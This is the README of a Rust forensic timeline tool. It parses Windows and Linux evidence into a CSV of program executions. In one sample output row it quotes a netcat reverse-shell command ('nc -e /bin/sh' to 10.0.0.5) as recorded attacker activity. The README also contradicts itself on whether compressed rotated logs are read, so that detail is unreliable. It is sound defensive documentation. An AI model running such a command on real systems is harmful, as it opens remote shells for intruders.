# CAAREA

**One command. Every program execution on a machine, in order, in a CSV.**

CAAREA (*Chronological Artifacts & Activity Reconstruction Engine for Analysis*) reads Windows and Linux forensic evidence and writes a single timeline of *what ran, when, as whom and from where*. Point it at a disk image, a triage package or a folder of logs; open the CSV in Timeline Explorer or Excel.

```bash
caarea -f workstation.E01 -o workstation.csv
caarea -d /cases/acme/UAC_collections -o linux_fleet.csv
caarea -d C:\Cases\Triage_Host01 --toi 2026-09-24T12:00:00Z --toi-window 6 -o incident_window.csv
```

Written in Rust. One static binary for Windows, Linux and macOS. No mounting, no Python, no drivers.

---

## What it does for you

- **Windows and Linux in the same timeline.** A KAPE zip from the file server and a UAC tarball from the web server end up in one CSV, sorted together, each row stamped with its host.
- **Reads the sources others skip.** Volume Shadow Copies inside E01/raw images, dirty registry hives (their transaction logs are replayed in memory), Prefetch (including the compressed Windows 10/11 format), PowerShell console history, scheduled task XML, Windows Error Reporting, Defender support logs, kernel process accounting (`pacct`), `auditd` execve records, PowerShell ScriptBlock and module logging, Sysmon, AppLocker, WMI consumers.
- **Gets the time right.** Every timestamp is converted to UTC. Linux logs that only carry wall-clock time (classic syslog, `dpkg.log`, `ps`) are corrected with the host's own time zone, found in the evidence (`/etc/timezone`, `/etc/localtime`, `timedatectl`).
- **Tells you where a row came from.** Events that only exist in a shadow copy are tagged with the snapshot time; a live event and its snapshot twin are not shown twice. The same vocabulary will mark rows recovered from freed structures and from carving.
- **Recovers what was deleted.** Freed registry cells and unused `$MFT` records are read by default; `--carve` scans the raw bytes of images, live volumes and pagefiles for hives, event log chunks, MFT and journal records and Prefetch files that no file system points to any more.
- **Treats evidence as hostile.** Archives are unpacked into an isolated, per-run temporary folder; entries cannot escape it, symlinks are never followed, and packages with the same file name from different hosts never overwrite each other. The evidence itself is only ever read.

---

## Quick start

```bash
git clone https://github.com/jupyterj0nes/caarea.git
cd caarea
cargo build --release          # binary in target/release/caarea[.exe]
```

| You have | Run |
| :--- | :--- |
| A disk image (E01, Ex01, raw, dd, 001) or a virtual disk (VMDK, VHD, VHDX) | `caarea -f disk.E01 -o out.csv` |
| A running Windows host (triage in place, as administrator) | `caarea -f \\.\C: -o out.csv --stage-dir D:\case\extracted` |
| Triage packages (KAPE, Velociraptor, UAC, Cortex XDR, CyLR), zipped or not | `caarea -d /path/to/packages -o out.csv` |
| A folder you collected by hand (`C:\Windows\System32\winevt\Logs`, `/var/log`, ...) | `caarea -d /path/to/folder -o out.csv` |
| Single files (an EVTX, a hive, an `audit.log`) | `caarea -f Security.evtx -f SYSTEM -f audit.log -o out.csv` |

Add `-m evtx`, `-m registry`, `-m windows` (Prefetch and the other Windows file artifacts) or `-m linux` to run one parser family only. Add `--overwrite` to replace an existing CSV.

---

## What comes out

An RFC 4180 CSV with ten columns. Timestamps are UTC with a fixed width (`YYYY-MM-DDTHH:MM:SS.ffffffZ`), so sorting the text sorts the time.

| Column | Meaning |
| :--- | :--- |
| `timestamp` | When it happened, UTC |
| `computer` | Host name (from the event, the SYSTEM hive, the UAC hostname file or the package name) |
| `artifact` | Where the row comes from: `evtx:4688`, `evtx:sysmon:1`, `registry:bam`, `prefetch`, `linux:audit:execve`, ... Rows that were not read from the live evidence carry an extra segment and the detail in brackets: `evtx:4688:vss [2026-09-04T08:12:53Z]` (only in that shadow copy), `registry:bam:deleted` (recovered from a freed hive cell), `evtx:4688:carved [@0x1c3f80000]` (carved from raw bytes at that offset) |
| `event_id` | Windows event id, 0 otherwise |
| `pid` | Process id when the source has one (for 4688 it is the *new* process) |
| `subject_username` | Who ran it |
| `target_username` | Who it ran as, when different (`sudo`, `su`, services) |
| `processname` | Binary, script, task or package |
| `commandline` | Full command line or the details of the artifact |
| `parentprocessname` | Parent process or launching component |

Two real rows:

```csv
"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,488,"WORKGROUP\IE10WIN7$","","C:\Windows\duKhLYUX.exe","C:\Windows\duKhLYUX.exe","C:\Windows\System32\services.exe"
"2025-09-26T00:01:40.243000Z","victim01","linux:audit:execve",0,3538,"1000","1000","/usr/bin/nc","nc -e /bin/sh 10.0.0.5 (CWD: /tmp)","PID: 2686"
```

---

## What it reads

### Windows

| Source | Events / keys | Notes |
| :--- | :--- | :--- |
| Security.evtx | 4688 process creation, 4689 process exit, 4697 service install, 4698-4702 task created / deleted / enabled / disabled / updated, 1102 audit log cleared | `DOMAIN\user`, PID from `NewProcessId`, task command pulled out of the task XML |
| System.evtx | 7045 service installed, 7034 service crashed, 7036 service state change, 104 log cleared, MsiInstaller 1033/1034/11707/11724 | account from `AccountName` |
| Application.evtx | 1000 application error, 1001 Windows Error Reporting | faulting binary, module, exception |
| Sysmon | 1 process creation, 5 process end, 6 driver loaded, 7 image loaded, 11 file created | image, command line, parent image, user |
| PowerShell | 400 engine start, 800 pipeline, 4103 module logging, 4104 ScriptBlock | full script block text, command invocation with parameters |
| TaskScheduler/Operational | 100, 102, 106, 107, 108, 118, 119, 129, 140, 141, 200, 201 | started, completed, registered, triggered, launched, updated, deleted, action started / completed |
| WMI-Activity/Operational | 5857 provider loaded, 5858 query, 5859/5860 permanent / temporary consumer, 5861 consumer bound | query text, client PID |
| AppLocker | 8002-8007, 8020-8022 | allowed, audited, blocked executables, scripts and packaged apps |
| Windows Defender/Operational | 1015, 1116, 1117 | threat, path, process, action |
| Shell-Core/Operational | 9707 / 9708 | Run / RunOnce command started / finished |
| BITS-Client/Operational | 3, 4, 59, 60 | job created / completed, transfer started / stopped with URL |
| Prefetch (`*.pf`) | up to eight run times per executable, run count, files loaded, volume | XP to Windows 11; the Windows 10/11 `MAM` compression is decoded in-process. Servers do not write Prefetch unless enabled |
| PSReadLine `ConsoleHost_history.txt` | every command typed in an interactive PowerShell | no per-line time: rows carry the file time, in order |
| `System32\Tasks\**` task XML | author, principal, triggers, every Exec / COM action | row time is the file's modification time |
| WER `Report.wer` | crashed program, module, exception, PID | `ReportArchive` and `ReportQueue` |
| Defender `MPLog-*.log`, `MPDetection-*.log` | processes the engine scanned on behalf of (with PID), behaviour-monitoring images, detections | |
| PCA `PcaAppLaunchDic.txt`, `PcaGeneralDb*.txt` (Windows 11) | program launches with time, exit code | |
| SRUM `SRUDB.dat` | per application and user: runs with start and duration (app timeline, Windows 10 1709+ clients), CPU time and bytes read / written per hour, network bytes per hour (data usage and the newer SDP tables), network connectivity spans; up to 60 days back | pure-Rust ESE reader, dirty databases read as far as their pages allow |
| Jump Lists (`*.automaticDestinations-ms`, `*.customDestinations-ms`) and `Recent\*.lnk` | which application opened which target and when, access counts, command-line arguments, origin machine | shortcut rows take the shortcut's own file time; well-known AppIDs are named |
| Windows Timeline `ActivitiesCache.db` | applications opened (with the document or URI) and the seconds each one held the focus, per account, about 30 days back; rows still queued in `ActivityOperation` included | SQLite read from a scratch copy with its write-ahead log, the evidence is never written |
| WMI repository `OBJECTS.DATA` | permanent event subscriptions: `CommandLineEventConsumer`, `ActiveScriptEventConsumer`, `__EventFilter`, bindings; instances found by class name in the raw pages, so deleted ones still in page slack come back | row time is the stamp on the instance record (the WMI service start preceding the write, so a lower bound), the file time when the record header cannot be located |
| `RecentFileCache.bcf` (Windows 7 / 2008 R2) | executables run since the last ProgramDataUpdater pass | no per-entry time: rows carry the file time, in order |
| `Syscache.hve` (Windows 7 / 2008 R2) | executables processed by the Application Experience service: MFT reference, SHA-1, program id; key write time | parsed as a hive, freed cells included |
| `$MFT` | executables and scripts written outside the system folders (created and modified times, size, resident script content quoted), Prefetch, logs, hives and histories anywhere; freed records carry the `deleted` origin | `$SI` created before `$FN` created is noted |
| `$UsnJrnl:$J` | every program run (its Prefetch file is created or rewritten), binaries dropped, renamed, modified or deleted, event logs truncated, histories and reports removed | folders come from the `$MFT` of the same volume |
| SYSTEM / SOFTWARE | BAM/DAM, ShimCache, services, Run/RunOnce, TaskCache, IFEO/Winlogon/AppInit, installed programs | |
| NTUSER.DAT / UsrClass.dat | UserAssist, RunMRU, RecentDocs, TypedPaths, WordWheelQuery, MUICache, Compatibility Assistant store, RecentApps, FeatureUsage, CapabilityAccessManager (camera, microphone, location use per program), Office TrustRecords, profile load/unload | user taken from the path (`Users\<name>\NTUSER.DAT`) |
| Amcache.hve | files and programs with SHA-1 | |

Every `.evtx` in a folder is parsed and filtered by provider and event id, so renamed channel files are fine. Rows that are identical in every column (two records with the same time, user, process and command line) are collapsed into one. Dirty hives are repaired before parsing: `.LOG1`/`.LOG2` entries are verified (Marvin32 hashes), applied in sequence order and only when they belong to that hive. The result matches, byte for byte, what Windows itself produces when it loads the same hive.

### Linux

| Source | What is extracted |
| :--- | :--- |
| `pacct` / `psacct` / `acct` | every terminated process: command, UID, PID, PPID, flags (`struct acct_v3` and legacy `struct acct`, both byte orders) |
| `audit.log` | `USER_CMD` (sudo) and `execve` calls rebuilt from `SYSCALL` + `EXECVE` + `CWD` + `PROCTITLE`, hex decoded |
| systemd journal (`/var/log/journal/**/*.journal`, `*.journal~`) | `sudo`, `su`, `pkexec` and cron command lines, units started by systemd, and the first message of every process that logged (PID and command line from the trusted fields). This is where Fedora, RHEL 8+, Arch and Debian 12 keep what `auth.log` used to hold |
| `auth.log`, `secure`, `cron`, `syslog`, `messages`, `kern.log` | cron jobs, `sudo` commands, `su` switches, kernel segfaults; classic and RFC 3339 timestamps; rotated `.gz` and `.xz` copies are read too |
| `.bash_history`, `.zsh_history`, `fish_history`, `.python_history`, `.mysql_history`, `.psql_history`, `.sqlite_history`, `.node_repl_history`, `.lesshst`, `.viminfo` | commands (with epoch stamps when present), files edited |
| `dpkg.log`, `apt/history.log`, `dnf.rpm.log`, `yum.log`, `pacman.log`, `zypp/history`, UAC rpm query | package installs, and the exact `apt`, `pacman` and `zypper` command lines with the user who ran them |
| `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/**`, systemd `.service` and `.timer` units, `/var/lib/systemd/timers/stamp-*` | scheduled jobs, services, timers and when each timer last fired |
| `wtmp`, `btmp`, `utmp` | logins, logouts, boots, failed logins |
| Docker `config.v2.json`, containerd task `config.json`, podman `containers.json` | containers created, started and finished: image, command, user, PID |
| `cloud-init.log`, `/var/mail/*` | user-data and `runcmd` scripts run at first boot; cron job output mails with the command in the subject |
| `recently-used.xbel` | documents opened from the desktop |
| web server access logs | requests to server-side scripts, POSTs, command-injection payloads in the query string |
| UAC `ps -axo ... lstart`, `running_processes_full_paths.txt` | running processes, deleted binaries still in memory, executions from `/tmp` and `/dev/shm` |

### Disk images

E01/Ex01, raw/dd and virtual disks (VMware VMDK: monolithic or split, sparse or flat; Hyper-V VHD and VHDX, fixed or dynamic) are read in place, without converting or mounting. MBR and GPT partition tables, NTFS traversal, BitLocker detection. Linux images are read the same way: ext2/3/4 partitions, bare partition images and ext4 logical volumes inside LVM2 are walked with a pure-Rust reader and the files listed above (plus `/etc/hostname`, `/etc/localtime` and its symlink target) are staged with their original paths. XFS and btrfs are not read yet. From the live volume and from **every Volume Shadow Copy**: event logs, `config` hives with their transaction logs, `Amcache.hve`, `NTUSER.DAT` and `UsrClass.dat` of every profile, Prefetch, task XML, WER reports, Defender logs, PCA logs, SRUM, the WMI repository, `RecentFileCache.bcf`, `Syscache.hve`, `$MFT`, `$UsnJrnl:$J` and, per profile, the PowerShell history, Recent shortcuts and Jump Lists and the Timeline database. Shadow copies are read with [vshadow-rs](https://github.com/jupyterj0nes/vshadow-rs), pure Rust, straight from the image.

---

## Carving, when you ask for it

`--carve` is off by default and changes nothing about the normal run. With it, every disk image or live volume is read a second time from the first byte to the last, and so are the `pagefile.sys`, `swapfile.sys` and `hiberfil.sys` of each NTFS partition (in place, through their data runs). A plain `-f` file that no parser recognises (a pagefile copied out, a memory dump, a dump of unallocated clusters) is scanned the same way. One pass looks for every structure at once:

| Structure | How it proves itself | What you get |
| :--- | :--- | :--- |
| Registry hives (`regf`) | primary hive, sane sizes, hive-bin chain followed offset by offset, root key verified; copies identical to a hive already extracted are skipped | a hive file in the staging folder, parsed by the normal registry pipeline, freed cells included |
| EVTX chunks (`ElfChnk`) | each 64 KB chunk is parsed under a 3-second budget; the provider of its records names it | one synthetic EVTX per provider, parsed by the normal EVTX pipeline |
| Orphan event records (`**\0\0`) | size and trailing size agree, BinXML preamble, time between 2000 and 2040 | the record's time and id, as a trace of a cleared log |
| `$MFT` records (`FILE`) | header geometry and update-sequence fixups | created and modified rows for binaries, scripts and forensic files |
| `$I30` index blocks (`INDX`) | fixups, then the entries left in the slack after a deletion | the deleted child's name and times |
| USN journal records | coherent length, version 2 or 3, plausible time, printable name | the same rows as the live journal: Prefetch runs, drops, renames, deletions, log truncation |
| Prefetch (`MAM`, `SCCA`) | the file decompresses and parses | one row per run |
| systemd journal files (`LPKSHHRH`) | header with the file's own size | the file, read by the journal parser (Linux images and blobs) |
| `pacct` records | version 3, printable command, start time between 2000 and 2040, small ids | one row per process, same columns as the live parser |
| utmp records | session type, printable user and line, plausible time, zero padding | logins, logouts, boots |
| auditd lines | `type=... msg=audit(<10-digit epoch>...)` at the start of a text run | assembled like `audit.log`: `execve` with argv and cwd, `USER_CMD` |
| shell history with stamps | `#<epoch>` line followed by a command | the command at that time |

Linux structures are looked for in images with ext4 or LVM partitions and in blobs; Windows structures everywhere. The journal of a running system also receives kernel audit records when no `auditd` is installed; those are assembled into `execve` rows like an `audit.log`.

Rows from carving carry the `carved` origin with the byte offset, and the container when it is not the disk itself: `evtx:4688:carved [@0x1c3f80000]`, `prefetch:carved [pagefile @0x4f000]`. A carved row identical to a live one is dropped by the usual deduplication. Carving only recovers structures that carry their own time; it never guesses a timestamp.

The scanner, the guarded sources and the structural validators are the [blockcarve](https://github.com/jupyterj0nes/blockcarve) crate, shared with masstin, faramir and allymacb, so the four tools read raw bytes the same way and accept a structure for the same reasons.

---

## Time zones, honestly

Most sources carry their own zone (EVTX, registry FILETIMEs, audit, pacct, RFC 3339 syslog, web logs with offset) and are simply converted to UTC.

Classic syslog lines (`Sep 20 03:10:01`), `dpkg.log` and `ps lstart` are wall-clock times of the host. CAAREA looks for the host's zone in the evidence, in this order, and prints what it found:

1. `/etc/timezone`
2. the target of the `/etc/localtime` symlink (kept by the extractor as `etc/localtime.symlink`)
3. `/etc/localtime` as a TZif file, parsed with its transition table
4. UAC `live_response/system/timedatectl_status.txt`
5. UAC `live_response/system/date.txt`
6. UTC, with a warning

Daylight saving is applied per date through the embedded tz database. Force a zone with `--tz Europe/Madrid`, `--tz +02:00` or `--tz UTC`.

---

## Command reference

```text
caarea [OPTIONS] --output <PATH>

  -d, --directory <PATH>      Evidence directory or triage folder (repeatable)
  -f, --file <PATH>           Disk image, archive or single artifact (repeatable)
  -o, --output <PATH>         Destination CSV
  -m, --modules <MODULES>     evtx | registry | windows | linux | all   [default: all]
  -t, --toi <TIMESTAMP>       Centre of a time window of interest (ISO-8601)
  -w, --toi-window <HOURS>    Hours before and after the TOI       [default: 24]
      --start-time <TS>       Keep events from this time on
      --end-time <TS>         Keep events up to this time (a bare date includes the whole day)
      --tz <ZONE>             Time zone of the Linux hosts for zone-less logs (default: detected)
      --carve                 Also scan raw bytes (images, live volumes, pagefiles, blobs) for structures
                              no file system points to; off by default, reads the whole image
      --stage-dir <PATH>      Keep the artifacts extracted from images, live volumes and archives here
      --overwrite             Replace the output file if it exists
  -s, --silent                Print nothing but errors
  -h, --help / -V, --version
```

---

## How it is tested

`cargo test` runs 64 tests. They include real-layout records for every binary format, real auditd lines, the public TZif files of two zones, and safety tests that try to break out of the staging folder.

Beyond the unit tests, the parsers were checked against:

- 524 public EVTX samples ([EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES), [EVTX-to-MITRE-Attack](https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack), DeepBlueCLI): the count per file matches `Get-WinEvent` exactly for every supported event id.
- The registry test corpus of [yarp](https://github.com/msuhanov/yarp): the transaction log replay (in the shared [blockcarve](https://github.com/jupyterj0nes/blockcarve) crate, `hive_logs`) gives the same hive bins as Windows 10 and Windows 7 when they recovered those dirty hives themselves; set `BLOCKCARVE_YARP_HIVES=<path>/hives_for_tests` for blockcarve's test suite.
- Real `pacct` files, Ubuntu 24.04 logs, an NTFS volume image produced on a Linux box and a 50 GB Windows workstation VMDK (dirty SYSTEM, SOFTWARE, DEFAULT and Amcache hives replayed from their logs).

The TaskScheduler operational channel is off by default on Windows clients and no public corpus has it. `scripts\gen_taskscheduler_sample.ps1` turns it on (one UAC prompt), creates and runs a harmless task, exports the channel and runs CAAREA on it.

---

## Limits worth knowing

- BitLocker volumes are detected and skipped; decrypt first.
- Compressed rotated logs (`.gz`, `.xz`) are not read; extract them next to the originals.
- Archives inside archives are followed five levels deep.
- Classic syslog has no year; it is inferred from the file's modification time, so logs spanning more than a year lose precision.
- The CSV has no "source file" column by design; run with `-m` or per package when you need that separation.

---

## License

Internal DFIR research tool by [jupyterj0nes](https://github.com/jupyterj0nes). Issues and pull requests are welcome.
